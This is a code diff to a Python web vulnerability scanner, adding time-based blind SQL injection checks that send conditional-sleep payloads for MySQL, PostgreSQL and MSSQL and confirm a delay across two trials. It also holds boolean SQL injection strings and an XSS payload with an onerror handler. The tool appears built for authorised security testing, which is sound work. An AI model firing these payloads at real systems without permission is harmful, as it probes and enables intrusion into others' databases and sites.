@@ -16,6 +16,7 @@ No stacked queries, time-based blind, or exfiltration — it flags leads to conf
 """
 from __future__ import annotations
 
+import time
 import urllib.parse
 from collections import deque
 
@@ -39,11 +40,49 @@ _XSS_EXEC_FLAG = "__c0mr4de_xss_exec7"
 _XSS_EXEC_PAYLOAD = f'"><img src=x onerror=window.{_XSS_EXEC_FLAG}=1>'
 _STATIC_EXT = (".png", ".jpg", ".jpeg", ".gif", ".svg", ".css", ".js", ".ico",
                ".woff", ".woff2", ".ttf", ".webp", ".pdf", ".mp4")
+# Time-based blind SQLi: a conditional-sleep payload should delay the response by
+# ~N seconds, reproducibly. This is PageBreak's SQLi validator pattern ("verifying
+# the output and/or timing") - often the ONLY signal when errors are suppressed and
+# boolean-diff is too noisy. Multi-engine, tried in order, first confirmed hit wins.
+_SQLI_SLEEP_SECONDS = 3
+_SQLI_TIME_PAYLOADS = (
+    f"' OR SLEEP({_SQLI_SLEEP_SECONDS})-- -",             # MySQL / MariaDB
+    f"'||pg_sleep({_SQLI_SLEEP_SECONDS})||'",             # PostgreSQL (string context)
+    f"'; WAITFOR DELAY '0:0:{_SQLI_SLEEP_SECONDS}'-- ",   # MSSQL
+)
 
 
 def _sql_err(body: str) -> bool:
     low = (body or "").lower()
     return any(s in low for s in _SQL_ERRORS)
+
+
+def _timed(send, val) -> float:
+    t0 = time.time()
+    send(val)
+    return time.time() - t0
+
+
+def _confirm_time_sqli(send, orig: str) -> str | None:
+    """Deterministic time-based blind SQLi confirmation. Requires the delay to
+    reproduce on a SECOND trial (not a fluke/network blip) before confirming."""
+    threshold = _SQLI_SLEEP_SECONDS * 0.7
+    try:
+        if _timed(send, orig) >= threshold:
+            return None  # endpoint is already slow baseline - timing signal unreliable
+    except httpx.HTTPError:
+        return None
+    for payload in _SQLI_TIME_PAYLOADS:
+        try:
+            if _timed(send, orig + payload) < threshold:
+                continue
+            if _timed(send, orig + payload) >= threshold:   # reproduced -> confirmed
+                return (f"SQLi (time-based) CONFIRMED: a conditional sleep payload consistently "
+                        f"delayed the response by ~{_SQLI_SLEEP_SECONDS}s across 2 trials "
+                        f"(deterministic timing proof, not a guess)")
+        except httpx.HTTPError:
+            continue
+    return None
 
 
 def _get(url: str) -> tuple[int, str]:
@@ -57,19 +96,29 @@ def _analyze(send, base_body: str, base_len: int, orig: str, exec_url=None) -> l
     given, lets the XSS check escalate from string-reflection to a PageBreak-style
     execution-confirmed result (load it in a real browser, check the JS actually ran)."""
     notes: list[str] = []
+    sqli_confirmed = False
     try:
         _, bd = send(orig + "'")
         if _sql_err(bd) and not _sql_err(base_body):
             notes.append("SQLi: DB error on a single-quote payload (error-based)")
+            sqli_confirmed = True
     except httpx.HTTPError:
         pass
-    try:
-        _, t_body = send(orig + "' OR '1'='1")
-        _, f_body = send(orig + "' AND '1'='2")
-        if abs(len(t_body) - len(f_body)) > max(40, 0.05 * base_len):
-            notes.append("SQLi (blind): TRUE vs FALSE payloads gave materially different responses")
-    except httpx.HTTPError:
-        pass
+    if not sqli_confirmed:
+        try:
+            _, t_body = send(orig + "' OR '1'='1")
+            _, f_body = send(orig + "' AND '1'='2")
+            if abs(len(t_body) - len(f_body)) > max(40, 0.05 * base_len):
+                notes.append("SQLi (blind): TRUE vs FALSE payloads gave materially different responses")
+                sqli_confirmed = True
+        except httpx.HTTPError:
+            pass
+    if not sqli_confirmed:
+        # Only pay the timing cost (can take several seconds) when the cheap checks
+        # above found nothing - this is the last-resort but strongest SQLi signal.
+        time_note = _confirm_time_sqli(send, orig)
+        if time_note:
+            notes.append(time_note)
     try:
         _, x_body = send(_XSS_PAYLOAD)
         reflected_raw = _XSS_PAYLOAD in x_body
